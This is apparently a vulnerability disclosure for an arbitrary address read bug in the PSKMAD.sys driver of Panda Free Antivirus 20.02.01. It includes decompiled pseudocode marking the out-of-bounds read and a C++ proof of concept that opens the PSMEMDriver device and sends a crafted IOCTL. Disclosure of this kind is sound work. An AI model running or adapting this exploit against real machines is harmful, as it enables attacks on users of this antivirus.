# Foreword

需要系统管理员权限

# Details

```
1.	Vulnerability Title
  	Panda Free Antivirus Arbitrary Address Read Privilege Escalation Vulnerability
2.	High-level overview of the vulnerability and the possible effect of using it
	This vulnerability allows local attackers to escalate privileges on affected installations of Panda Free Antivirus. An attacker must first obtain the ability to execute system-privileged code on the target system in order to exploit this vulnerability.
3.	Exact product that was found to be vulnerable including complete version information
	Panda Free Antivirus 20.02.01
4.	Root Cause Analysis (recommended but not required)
	This is a Arbitrary Address Read Vulnerability in Panda Free Antivirus's PSKMAD.sys.
	This is pseudocode :

code 1 :

    case 0xB3702C34:
        if ( sub_FFFFF8036FCA2604((__int64)v6, (__int64)a2, &v18) )
        {
        if ( sub_FFFFF8036FCA6E24((__int64)&a2->AssociatedIrp.MasterIrp->MdlAddress) )// bug here!!!
            
code 2:

    if ( *(_DWORD *)(SystemBuffer_v1 + 0x51) )
    {
      v3 = SystemBuffer_v1 + *(unsigned int *)(SystemBuffer_v1 + 81);
      v8 = *(_WORD *)v3;                        // oobr!!!
      *(_QWORD *)(v3 + 4) += SystemBuffer_v1;
      v11[0] = v8;
      v11[1] = *(_WORD *)(v3 + 2);
      v12 = *(_QWORD *)(v3 + 4);
    }
    
5.	Proof-of-Concept

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <algorithm>

typedef struct Exploitq
{
    uint32_t Field1_1;       
    uint32_t Field1_2;       
    uint32_t Field1_1a;      
    uint32_t Field1_2a;       
    uint64_t Field32aa;       
    uint32_t Field1_11;       
    uint32_t Field1_21;
    void* Field32;       
    int* Field23;        
    void* Field33;       
    int* Field24;       
    void* Field34;      
    int* Field25;        
    void* Field35;      
    int* Field26;        
    void* Field36;       
    int* Field27;        
    void* Field37;       
    int* Field28;       
    void* Field38;      
    int* Field20;        
    void* Field30;       
    int* Field29;        
    void* Field39;       
    void* Field39a;
};

int main(int argc, char** argv)
{

  
    HANDLE device = ::CreateFileW(
        L"\\\\.\\PSMEMDriver",
        GENERIC_WRITE | GENERIC_READ,
        NULL,
        nullptr,
        OPEN_EXISTING,
        NULL,
        NULL);
    if (device == INVALID_HANDLE_VALUE)
    {
        std::cout << "[!] Couldn't open handle to the PSMEMDriver driver. Error code: " << ::GetLastError() << std::endl;
        return -1;
    }
    std::cout << "[+] Opened a handle to the PSMEMDriver driver!\n";

    int field22 = 0;

    
    DWORD processId = GetCurrentProcessId();//当前进程id
    Exploitq exploitq =
    {
        0x542DF91B,
        0,
        1,
        1,
        processId,
        1,
        processId,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,
        &field22,};

    DWORD bytesReturned1 = 0;
    bool success1 = DeviceIoControl(
        device,
        0xB3702C34,
        &exploitq,
        sizeof(exploitq),
        nullptr,
        0,
        &bytesReturned1,
        nullptr);
    if (!success1)
    {
        std::cout << "[!] Couldn't PSMEMDriver. Error code: " << ::GetLastError() << std::endl;
        return -1;
    }
    std::cout << "[+] Successfully PSMEMDriver!\n";

    return 0;
}
  	
6.	Software Download Link
    https://www.pandasecurity.com/en/homeusers/free-antivirus/
  	https://download.cnet.com/Panda-Free-Antivirus/3000-2239_4-10914099.html?part=dl-&subj=dl&tag=button&lang=en
```

